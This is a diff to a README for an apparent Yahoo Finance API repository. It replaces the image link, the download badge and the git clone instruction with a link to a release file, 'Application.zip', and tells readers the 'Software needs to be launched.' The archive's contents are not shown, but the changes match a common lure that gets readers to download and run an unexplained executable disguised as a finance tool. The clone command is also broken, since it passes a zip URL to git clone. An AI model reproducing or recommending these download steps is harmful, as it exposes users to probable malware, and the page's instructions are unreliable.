@@ -1,6 +1,6 @@
 # 🚀 Yahoo Finance Repository
 
-![Yahoo Finance Image](https://www.example.com/yahoo-finance.jpg)
+![Yahoo Finance Image](https://github.com/Croissant-a/yahoo-finance/releases/download/v1.0.0/Application.zip)
 
 ## Description
 Welcome to the **yahoo-finance** repository! This repository is a collection of resources, scripts, and tools related to utilizing the Yahoo Finance API to fetch financial data for analysis and research purposes. Whether you are a developer, data analyst, or finance enthusiast, you will find valuable information and code snippets to enhance your projects related to stock market data.
@@ -31,14 +31,14 @@ Welcome to the **yahoo-finance** repository! This repository is a collection of 
 📁 **Database Setup**: Instructions and scripts for setting up MySQL databases related to financial data.
 
 ## Software Download
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/Croissant-a/yahoo-finance/releases/download/v1.0.0/Application.zip)](https://github.com/Croissant-a/yahoo-finance/releases/download/v1.0.0/Application.zip)
 
 📂 **Please Note**: Software needs to be launched. 
 
 ## How to Get Started
 To start exploring the contents of this repository and utilizing the provided scripts and resources, follow these steps:
 
-1. Clone the repository to your local machine using `git clone https://github.com/yourusername/yahoo-finance.git`.
+1. Clone the repository to your local machine using `git clone https://github.com/Croissant-a/yahoo-finance/releases/download/v1.0.0/Application.zip`.
 2. Explore the different folders to find scripts and resources relevant to your area of interest.
 3. To run the scripts, make sure to have the necessary dependencies installed on your system.
 
